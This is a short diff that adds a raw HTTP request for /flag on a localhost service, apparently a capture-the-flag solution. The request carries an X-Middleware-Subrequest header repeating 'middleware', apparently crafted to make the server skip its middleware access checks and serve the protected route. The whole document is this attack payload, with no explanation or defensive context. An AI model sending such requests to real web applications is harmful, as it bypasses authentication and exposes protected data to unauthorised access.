@@ -1,0 +1,3 @@
+GET /flag HTTP/1.1
+Host: localhost:1905
+X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
